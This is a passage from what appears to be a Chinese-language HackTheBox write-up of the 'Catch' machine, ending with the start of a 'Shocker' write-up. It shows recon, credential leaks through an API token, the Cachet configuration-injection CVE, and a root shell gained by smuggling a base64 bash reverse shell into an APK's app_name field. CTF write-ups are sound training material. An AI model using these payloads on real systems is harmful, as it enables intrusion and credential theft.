fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/6%OT=22%CT=1%CU=30269%PV=Y%DS=2%DC=T%G=Y%TM=624D4342\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10\nOS:5%GCD=3%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3\nOS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=F\nOS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW\nOS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF\nOS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=\nOS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=\nOS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI\nOS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   276.00 ms 10.10.14.1\n2   276.19 ms 10.10.11.150\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 160.41 seconds\n```\n## HTTP\n### 80 端口\n![](Hackthebox-Catch/69e43a85-65a9-4113-9afc-9f8940987d18.png)\n\n访问后发现任何页面，除了下载 apk 以外，都无法点。\n\n接着我做了一下 fuzz，也并没有东西，先把 apk 文件下载下来吧，同时去看看其他内容\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.150/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\njavascript              [Status: 301, Size: 317, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 277, Words: 20, Lines: 10]\n                        [Status: 200, Size: 6163, Words: 855, Lines: 375]\n:: Progress: [20116/20116] :: Job [1/1] :: 112 req/sec :: Duration: [0:02:39] :: Errors: 0 ::\n```\n没有内容\n\n### 5000 端口\n![](Hackthebox-Catch/56804c39-c012-4df1-90a7-1bbdaca4477d.png)\n\n5000 端口是一个登陆页面，但是似乎没有账号\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.150:5000/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150:5000/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nlogout                  [Status: 302, Size: 28, Words: 4, Lines: 1]\nmedia                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nlogin                   [Status: 200, Size: 2622, Words: 709, Lines: 57]\nfiles                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nusers                   [Status: 401, Size: 12, Words: 1, Lines: 1]\naccount                 [Status: 401, Size: 12, Words: 1, Lines: 1]\nLogin                   [Status: 200, Size: 2622, Words: 709, Lines: 57]\nConnections             [Status: 401, Size: 12, Words: 1, Lines: 1]\nconnections             [Status: 401, Size: 12, Words: 1, Lines: 1]\nFiles                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nmessages                [Status: 401, Size: 12, Words: 1, Lines: 1]\nAccount                 [Status: 401, Size: 12, Words: 1, Lines: 1]\nMedia                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nUsers                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nFILES                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nLogout                  [Status: 302, Size: 28, Words: 4, Lines: 1]\nMessages                [Status: 401, Size: 12, Words: 1, Lines: 1]\n                        [Status: 302, Size: 28, Words: 4, Lines: 1]\nrooms                   [Status: 401, Size: 12, Words: 1, Lines: 1]\nMEDIA                   [Status: 301, Size: 177, Words: 7, Lines: 11]\nCONNECTIONS             [Status: 401, Size: 12, Words: 1, Lines: 1]\nLOGIN                   [Status: 200, Size: 2627, Words: 709, Lines: 57]\n:: Progress: [20116/20116] :: Job [1/1] :: 77 req/sec :: Duration: [0:05:20] :: Errors: 0 ::\n```\n东西还挺多，去看一下\n\n![](Hackthebox-Catch/e7bfff2a-25b5-4df6-b1d5-ec6a13a98e2d.png)\n\n提示 Unauthorized 没有令牌嘛，毕竟没有登陆\n\n### 8000 端口\n![](Hackthebox-Catch/bc93a10b-b3a3-4e7e-9352-9c5fd13ed739.png)\n\n似乎是一个系统运行监控的，然后点击下面的仪表盘会进入一个登录页面\n\n![](Hackthebox-Catch/98515bd6-0376-4759-867d-e96c2584c7b8.png)\n\n试了几个弱口令都无法进去，去看看 apk 文件吧\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.11.150:8000/FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.11.150:8000/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\nadmin                   [Status: 302, Size: 386, Words: 60, Lines: 12]\nimg                     [Status: 301, Size: 317, Words: 20, Lines: 10]\nfonts                   [Status: 301, Size: 319, Words: 20, Lines: 10]\nsetup                   [Status: 302, Size: 382, Words: 60, Lines: 12]\ndashboard               [Status: 302, Size: 386, Words: 60, Lines: 12]\nstorage                 [Status: 403, Size: 279, Words: 20, Lines: 10]\ndist                    [Status: 301, Size: 318, Words: 20, Lines: 10]\nserver-status           [Status: 403, Size: 279, Words: 20, Lines: 10]\n                        [Status: 200, Size: 8870, Words: 1951, Lines: 302]\n:: Progress: [20116/20116] :: Job [1/1] :: 70 req/sec :: Duration: [0:05:55] :: Errors: 0 ::\n```\n也没啥可看的东西\n\n## Apk\n使用 apktool 进行反编译\n\n```bash\n┌──(root💀kali)-[~/Desktop/catch]\n└─# apktool d catchv1.0.apk \nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nI: Using Apktool 2.5.0-dirty on catchv1.0.apk\nI: Loading resource table...\nI: Decoding AndroidManifest.xml with resources...\nI: Loading resource table from file: /root/.local/share/apktool/framework/1.apk\nI: Regular manifest package...\nI: Decoding file-resources...\nI: Decoding values */* XMLs...\nI: Baksmaling classes.dex...\nI: Copying assets and libs...\nI: Copying unknown files...\nI: Copying original files...\n```\n然后查找一下 token\n\n```bash\n┌──(root💀kali)-[~/Desktop/catch]\n└─# grep -rn token catchv1.0/res/values/strings.xml\n43:    <string name=\"gitea_token\">b87bfb6345ae72ed5ecdcee05bcb34c83806fbd0</string>\n47:    <string name=\"lets_chat_token\">NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==</string>\n104:    <string name=\"slack_token\">xoxp-23984754863-2348975623103</string>\n```\n在 `/catchv1.0/res/values/string.xml` 下的第 47 行有一个 `lets_chat_token` ，应该就是这个了，来利用一下吧\n\n# 漏洞利用\n使用令牌授权进行读取\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl -H 'Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' 'http://10.10.11.150:5000/rooms'\n[{\"id\":\"61b86b28d984e2451036eb17\",\"slug\":\"status\",\"name\":\"Status\",\"description\":\"Cachet Updates and Maintenance\",\"lastActive\":\"2021-12-14T10:34:20.749Z\",\"created\":\"2021-12-14T10:00:08.384Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b8708efe190b466d476bfb\",\"slug\":\"android_dev\",\"name\":\"Android Development\",\"description\":\"Android App Updates, Issues & More\",\"lastActive\":\"2021-12-14T10:24:21.145Z\",\"created\":\"2021-12-14T10:23:10.474Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]},{\"id\":\"61b86b3fd984e2451036eb18\",\"slug\":\"employees\",\"name\":\"Employees\",\"description\":\"New Joinees, Org updates\",\"lastActive\":\"2021-12-14T10:18:04.710Z\",\"created\":\"2021-12-14T10:00:31.043Z\",\"owner\":\"61b86aead984e2451036eb16\",\"private\":false,\"hasPassword\":false,\"participants\":[]}]\n```\n读取一下 rooms 的内容\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# curl -H 'Authorization: bearer NjFiODZhZWFkOTg0ZTI0NTEwMzZlYjE2OmQ1ODg0NjhmZjhiYWU0NDYzNzlhNTdmYTJiNGU2M2EyMzY4MjI0MzM2YjU5NDljNQ==' 'http://10.10.11.150:5000/rooms/61b86b28d984e2451036eb17/messages'\n[{\"id\":\"61b8732cfe190b466d476c02\",\"text\":\"ah sure!\",\"posted\":\"2021-12-14T10:34:20.749Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b8731ffe190b466d476c01\",\"text\":\"You should actually include this task to your list as well as a part of quarterly audit\",\"posted\":\"2021-12-14T10:34:07.449Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b872b9fe190b466d476c00\",\"text\":\"Also make sure we've our systems, applications and databases up-to-date.\",\"posted\":\"2021-12-14T10:32:25.514Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87282fe190b466d476bff\",\"text\":\"Excellent! \",\"posted\":\"2021-12-14T10:31:30.403Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87277fe190b466d476bfe\",\"text\":\"Why not. We've this in our todo list for next quarter\",\"posted\":\"2021-12-14T10:31:19.094Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87241fe190b466d476bfd\",\"text\":\"@john is it possible to add SSL to our status domain to make sure everything is secure ? \",\"posted\":\"2021-12-14T10:30:25.108Z\",\"owner\":\"61b86aead984e2451036eb16\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b8702dfe190b466d476bfa\",\"text\":\"Here are the credentials `john :  E}V!mywu_69T4C}W`\",\"posted\":\"2021-12-14T10:21:33.859Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b87010fe190b466d476bf9\",\"text\":\"Sure one sec.\",\"posted\":\"2021-12-14T10:21:04.635Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b86fb1fe190b466d476bf8\",\"text\":\"Can you create an account for me ? \",\"posted\":\"2021-12-14T10:19:29.677Z\",\"owner\":\"61b86dbdfe190b466d476bf0\",\"room\":\"61b86b28d984e2451036eb17\"},{\"id\":\"61b86f4dfe190b466d476bf6\",\"text\":\"Hey Team! I'll be handling the `status.catch.htb` from now on. Lemme know if you need anything from me. \",\"posted\":\"2021-12-14T10:17:49.761Z\",\"owner\":\"61b86f15fe190b466d476bf5\",\"room\":\"61b86b28d984e2451036eb17\"}]\n```\n继续读取一下房间内的消息\n\n```bash\nusername = john\npassword = E}V!mywu_69T4C}W\n```\n这里从上面的内容中提取到了一组账号密码\n\n拿到 8000 端口去登陆试试\n\n![](Hackthebox-Catch/805be4eb-bf6f-43a6-81e3-7ed44cdda94c.png)\n\n成功登陆，到处看看\n\n![](Hackthebox-Catch/9ef80eaa-402e-4a74-8020-501117eb15d7.png)\n\n我们可以看到，这是一个 cachet 的服务器，去搜索一下漏洞\n\n![](Hackthebox-Catch/1f547117-160c-4b87-ad11-3867a76705fa.png)\n\n找到了一篇 Cachet 2.4：通过 Laravel 配置注入执行代码 CVE-2021-39165\n\n> [https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection](https://blog.sonarsource.com/cachet-code-execution-via-laravel-configuration-injection)\n\n根据文章描述，拦截 EMAIL 的包，将内容修改为注入语句就行了\n\n修改为 \\${DB\\_USERNAME}\n\n![](Hackthebox-Catch/315e86c7-732c-4c23-acfe-1e3360e4907f.png)\n\n修改为 \\${DB\\_PASSWORD}\n\n![](Hackthebox-Catch/69151011-17e6-49a2-9f9f-12f2ab7edb88.png)\n\n```bash\nusername = will\npassowrd = s2#4Fg0_%3!\n```\n得到了一组账号密码，去登陆 ssh\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh will@10.10.11.150\nwill@10.10.11.150's password: \nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-104-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Wed 06 Apr 2022 08:41:02 AM UTC\n\n  System load:                      0.19\n  Usage of /:                       75.6% of 16.61GB\n  Memory usage:                     83%\n  Swap usage:                       33%\n  Processes:                        448\n  Users logged in:                  0\n  IPv4 address for br-535b7cf3a728: 172.18.0.1\n  IPv4 address for br-fe1b5695b604: 172.19.0.1\n  IPv4 address for docker0:         172.17.0.1\n  IPv4 address for eth0:            10.10.11.150\n  IPv6 address for eth0:            dead:beef::250:56ff:feb9:ffd\n\n0 updates can be applied immediately.\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Wed Apr  6 08:40:51 2022 from 10.10.14.9\nwill@catch:~$ whoami&&id\nwill\nuid=1000(will) gid=1000(will) groups=1000(will)\n```\n登陆成功\n\n```bash\nwill@catch:~$ ls\nuser.txt\nwill@catch:~$ cat user.txt \n24b48fcc5b166f68a855af04633081c7\n```\n成功拿到 user 权限的 flag 文件\n\n# 权限提升\n```bash\nwill@catch:~$ sudo -l\n[sudo] password for will: \nSorry, user will may not run sudo on catch.\n```\n查看 sudo -l 失败，那看来不是这个提权思路了\n\n去跑了一下 linpeas.sh\n\n```bash\n[+] Readable files belonging to root and readable by me but not world readable\n-rwxr-x--x+ 1 root root 1894 Mar  3 14:23 /opt/mdm/verify.sh\n-rw-r----- 1 root will 33 Apr  5 17:23 /home/will/user.txt\n```\n这里看到有一个 /opt/mdm/verify.sh 文件，去进程搜一下\n\n```bash\nwill@catch:~$ ps auxw|grep verify.sh\nwill      386873  0.0  0.0   6436   656 pts/0    S+   08:59   0:00 grep --color=auto verify.sh\n```\n也有运行记录，去查看一下文件\n\n```bash\nwill@catch:~$ cat /opt/mdm/verify.sh\n#!/bin/bash\n\n###################\n# Signature Check #\n###################\n\nsig_check() {\n        jarsigner -verify \"$1/$2\" 2>/dev/null >/dev/null\n        if [[ $? -eq 0 ]]; then\n                echo '[+] Signature Check Passed'\n        else\n                echo '[!] Signature Check Failed. Invalid Certificate.'\n                cleanup\n                exit\n        fi\n}\n\n#######################\n# Compatibility Check #\n#######################\n\ncomp_check() {\n        apktool d -s \"$1/$2\" -o $3 2>/dev/null >/dev/null\n        COMPILE_SDK_VER=$(grep -oPm1 \"(?<=compileSdkVersion=\\\")[^\\\"]+\" \"$PROCESS_BIN/AndroidManifest.xml\")\n        if [ -z \"$COMPILE_SDK_VER\" ]; then\n                echo '[!] Failed to find target SDK version.'\n                cleanup\n                exit\n        else\n                if [ $COMPILE_SDK_VER -lt 18 ]; then\n                        echo \"[!] APK Doesn't meet the requirements\"\n                        cleanup\n                        exit\n                fi\n        fi\n}\n\n####################\n# Basic App Checks #\n####################\n\napp_check() {\n        APP_NAME=$(grep -oPm1 \"(?<=<string name=\\\"app_name\\\">)[^<]+\" \"$1/res/values/strings.xml\")\n        echo $APP_NAME\n        if [[ $APP_NAME == *\"Catch\"* ]]; then\n                echo -n $APP_NAME|xargs -I {} sh -c 'mkdir {}'\n                mv \"$3/$APK_NAME\" \"$2/$APP_NAME/$4\"\n        else\n                echo \"[!] App doesn't belong to Catch Global\"\n                cleanup\n                exit\n        fi\n}\n\n###########\n# Cleanup #\n###########\n\ncleanup() {\n        rm -rf $PROCESS_BIN;rm -rf \"$DROPBOX/*\" \"$IN_FOLDER/*\";rm -rf $(ls -A /opt/mdm | grep -v apk_bin | grep -v verify.sh)\n}\n\n###################\n# MDM CheckerV1.0 #\n###################\n\nDROPBOX=/opt/mdm/apk_bin\nIN_FOLDER=/root/mdm/apk_bin\nOUT_FOLDER=/root/mdm/certified_apps\nPROCESS_BIN=/root/mdm/process_bin\n\nfor IN_APK_NAME in $DROPBOX/*.apk;do\n        OUT_APK_NAME=\"$(echo ${IN_APK_NAME##*/} | cut -d '.' -f1)_verified.apk\"\n        APK_NAME=\"$(openssl rand -hex 12).apk\"\n        if [[ -L \"$IN_APK_NAME\" ]]; then\n                exit\n        else\n                mv \"$IN_APK_NAME\" \"$IN_FOLDER/$APK_NAME\"\n        fi\n        sig_check $IN_FOLDER $APK_NAME\n        comp_check $IN_FOLDER $APK_NAME $PROCESS_BIN\n        app_check $PROCESS_BIN $OUT_FOLDER $IN_FOLDER $OUT_APK_NAME\ndone\ncleanup\n```\n这里的 app\\_check() 函数有问题\n\n它在 /res/values/strings.xml 的 APK 中搜索 APP\\_NAME\n\n我们可以利用一下 做一个命令注入\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# echo '/bin/bash -i >& /dev/tcp/10.10.14.9/4444 0>&1'|base64\nL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==\n\n┌──(root💀kali)-[~/Desktop]\n└─# echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg==|base64 -d\n/bin/bash -i >& /dev/tcp/10.10.14.9/4444 0>&1\n```\n然后编写一下 payload\n\n```bash\n<string name=\"app_name\">Catch|echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvNDQ0NCAwPiYxCg== | base64 -d | bash</string>\n```\n然后使用上面的 payload 替换 /res/values/strings.xml 的第 30 行 app\\_name 这一行\n\n接着使用 nc -nvlp 监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n然后去使用 github 上最新版本 2.6.1 的 apktool 来打包构造新的 app\n\n```bash\n┌──(root💀kali)-[~/Desktop/catch]\n└─# java -jar apktool_2.6.1.jar b -f -d catchv1.0 -o catchv2.0.apk                                                                        1 ⨯\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\nI: Using Apktool 2.6.1\nI: Smaling smali folder into classes.dex...\nI: Building resources...\nI: Building apk file...\nI: Copying unknown files/dir...\nI: Built apk...\n\n┌──(root💀kali)-[~/Desktop/catch]\n└─# ls\napktool_2.6.1.jar  catchv1.0  catchv1.0.apk  catchv2.0.apk\n```\n然后去给 apk 签名，并且验证\n\n```bash\nkeytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000\n\njarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore catchv2.0.apk alias_name\n\njarsigner -verify -verbose -certs catchv2.0.apk\n```\n```bash\n┌──(root💀kali)-[~/Desktop/catch]\n└─# keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000\nPicked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true\n输入密钥库口令:  \n再次输入新口令: \n您的名字与姓氏是什么?\n  [Unknown]:  \n您的组织单位名称是什么?\n  [Unknown]:  \n您的组织名称是什么?\n  [Unknown]:  \n您所在的城市或区域名称是什么?\n  [Unknown]:  \n您所在的省/市/自治区名称是什么?\n  [Unknown]:  \n该单位的双字母国家/地区代码是什么?\n  [Unknown]:  \nCN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确?\n  [否]:  y\n\n正在为以下对象生成 2,048 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 10,000 天):\n         CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown\n[正在存储my-release-key.keystore]\n\n┌──(root💀kali)-[~/Desktop/catch]\n└─# ls my-release-key.keystore \nmy-release-key.keystore\n```\n生成了一个签名文件，然后验证内容较多，就不放出来了，大家自行验证即可\n\n使用 python3 -m 开启一个 HTTP 服务器\n\n```bash\n┌──(root💀kali)-[~/Desktop/catch]\n└─# python3 -m http.server 80 \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n```\n然后使用 wget 下载这个 apk\n\n```bash\nwill@catch:~$ wget http://10.10.14.9/catchv2.0.apk\n--2022-04-06 09:28:38--  http://10.10.14.9/catchv2.0.apk\nConnecting to 10.10.14.9:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2821343 (2.7M) [application/vnd.android.package-archive]\nSaving to: ‘catchv2.0.apk’\n\ncatchv2.0.apk                       100%[=================================================================>]   2.69M   869KB/s    in 3.2s    \n\n2022-04-06 09:28:42 (869 KB/s) - ‘catchv2.0.apk’ saved [2821343/2821343]\n```\n然后将下载的 apk 放入 `/opt/mdm/apk_bin` 文件夹\n\n```bash\nwill@catch:~$ cp catchv2.0.apk /opt/mdm/apk_bin\nwill@catch:~$ ls /opt/mdm/apk_bin\ncatchv2.0.apk\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.11.150] 34410\nbash: cannot set terminal process group (397832): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@catch:~# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=0(root) groups=0(root)\n```\n然后等待一会儿，我们就会获得一个 root 权限的 shell\n\n```bash\nroot@catch:~# cd /root\ncd /root\nroot@catch:~# cat root.txt\ncat root.txt\n36160af074e848d9139b7d14c9c4e5ca\n```\n成功拿到 root 权限的 flag 文件","tags":["Hackthebox"]},{"title":"Shocker - Hackthebox","url":"/2022/04/04/Hackthebox/Easy/Hackthebox-Shocker/","content":"\n# Hackthebox - Shocker\n# 靶场信息\n![](Hackthebox-Shocker/64c68867-7663-4f1f-9728-ec9bb0e80ddf.png)\n\n# 靶场类型\n![](Hackthebox-Shocker/06ff7eaf-ae61-43de-aaab-3e046685bddb.png)\n\n# 信息收集\n## Nmap\n```bash\n┌──(root💀kali)-[~/Desktop/HTB/Easy/Shocker]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.56\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-01 22:29 EDT\nNmap scan report for 10.10.10.56\nHost is up (0.25s latency).\nNot shown: 65533 closed ports\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html).\n2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)\n|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)\n|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=4/1%OT=80%CT=1%CU=41565%PV=Y%DS=2%DC=T%G=Y%TM=6247B561\nOS:%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ(\nOS:SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=B)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%T\nOS:S=8)OPS(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=\nOS:M505ST11NW6%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7\nOS:120)ECN(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A\nOS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%\nOS:Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=\nOS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=\nOS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%\nOS:T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 61716/tcp)\nHOP RTT       ADDRESS\n1   246.66 ms 10.10.14.1\n2   246.79 ms 10.10.10.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 67.63 seconds\n```\n## Http\n![](Hackthebox-Shocker/5e3364e2-f2d4-4223-8013-e69a2527d7d4.png)\n\n这里也没看到什么东西，去 fuzz 一下\n\n## Fuzz\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ffuf -u \"http://10.10.10.56/FUZZ\" -w /usr/share/dirb/wordlists/common.txt                                   \n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://10.10.10.56/FUZZ\n :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n________________________________________________\n\n                        [Status: 200, Size: 137, Words: 9, Lines: 10]\n.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12]\n.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12]\n.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12]\ncgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 